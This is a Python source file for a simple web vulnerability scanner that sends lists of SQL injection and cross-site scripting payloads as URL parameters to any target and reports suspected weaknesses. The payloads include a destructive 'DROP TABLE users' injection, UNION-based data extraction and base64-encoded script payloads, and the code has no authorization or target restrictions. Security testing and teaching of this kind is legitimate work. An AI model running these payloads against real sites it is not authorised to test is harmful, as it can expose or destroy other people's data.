import requests
import threading

class PenetrationTester:
    def __init__(self):
        self.test_results = ""  # Store the results of the penetration tests
        self.is_testing = False  # Flag to check if testing is ongoing
        self.stop_testing = threading.Event()  # Event to stop testing

    def test_website(self, url):
        print(f"Testing website: {url}")
        self.is_testing = True
        self.stop_testing.clear()  # Reset the stop event
        try:
            # Start testing in a separate thread to avoid blocking the main thread
            test_thread = threading.Thread(target=self._run_tests, args=(url,))
            test_thread.start()
        except Exception as e:
            print(f"Error during penetration testing: {e}")

    def _run_tests(self, url):
        """Run SQL injection and XSS tests on the target URL."""
        self.test_results = self._check_sql_injection(url) + "\n" + self._check_xss(url)  # Combine results from both tests
        print(self.test_results)  # Print the results
        self.is_testing = False  # Mark testing as complete

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities."""
        results = "=== SQL Injection Test ===\n"
        payloads = [  # List of common SQL injection payloads
            "' OR '1'='1", "' OR '1'='1' --", "' UNION SELECT null, null, null --",
            "' OR 1=1; DROP TABLE users --", "' OR 'a'='a", "' OR 1=1#",
            "' OR '1'='1' /*", "' OR '1'='1' -- -", "' OR '1'='1' UNION SELECT * FROM users --",
            "' OR '1'='1' AND 1=CONVERT(int, (SELECT @@version)) --",
            "' OR '1'='1' AND 1=CAST((SELECT @@version) AS int) --",
            "' OR '1'='1' AND 1=1 --", "' OR '1'='1' AND 1=0 --",
            "' OR '1'='1' AND '1'='1", "' OR '1'='1' AND '1'='0"
        ]
        vulnerable = False  # Flag to track if any vulnerability is found
        for payload in payloads:
            if self.stop_testing.is_set():  # Check if testing should stop
                results += "Testing stopped by user.\n"
                break
            test_url = f"{url}?id={payload}"  # Append payload to the URL
            try:
                response = requests.get(test_url)  # Send GET request with the payload
                if "error" in response.text.lower() or "syntax" in response.text.lower():
                    # If the response contains error or syntax messages, it might be vulnerable
                    results += f"Potential SQL Injection vulnerability found with payload: {payload}\n"
                    vulnerable = True
            except Exception as e:
                results += f"Error testing payload {payload}: {e}\n"  # Handle errors during testing
        if not vulnerable:
            results += "No SQL Injection vulnerabilities detected.\n"  # No vulnerabilities found
        return results

    def _check_xss(self, url):
        """Check for Cross-Site Scripting (XSS) vulnerabilities."""
        results = "=== XSS Test ===\n"
        payloads = [  # List of common XSS payloads
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>", "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>", "<a href=javascript:alert('XSS')>Click Me</a>",
            "<div onmouseover=alert('XSS')>Hover Me</div>", "<input type=text value='XSS' onfocus=alert('XSS')>",
            "<marquee onstart=alert('XSS')>Scroll Me</marquee>", "<video><source onerror=alert('XSS')></video>",
            "<audio><source onerror=alert('XSS')></audio>", "<style>@keyframes xss{from{color:red;}to{color:blue;}}</style><div style='animation-name:xss;animation-duration:3s;'>XSS</div>",
            "<link rel=stylesheet href='data:text/css;base64,Ym9keSB7IGJhY2tncm91bmQtY29sb3I6IHJlZDsgfQ==' />",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
            "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='></object>"
        ]
        vulnerable = False  # Flag to track if any vulnerability is found
        for payload in payloads:
            if self.stop_testing.is_set():  # Check if testing should stop
                results += "Testing stopped by user.\n"
                break
            test_url = f"{url}?search={payload}"  # Append payload to the URL
            try:
                response = requests.get(test_url)  # Send GET request with the payload
                if payload in response.text:
                    # If the payload is reflected in the response, it might be vulnerable
                    results += f"Potential XSS vulnerability found with payload: {payload}\n"
                    vulnerable = True
            except Exception as e:
                results += f"Error testing payload {payload}: {e}\n"  # Handle errors during testing
        if not vulnerable:
            results += "No XSS vulnerabilities detected.\n"  # No vulnerabilities found
        return results

    def stop_test(self):
        """Stop the penetration testing."""
        self.stop_testing.set()  # Set the stop event
        self.is_testing = False
        print("Penetration testing stopped by user request.")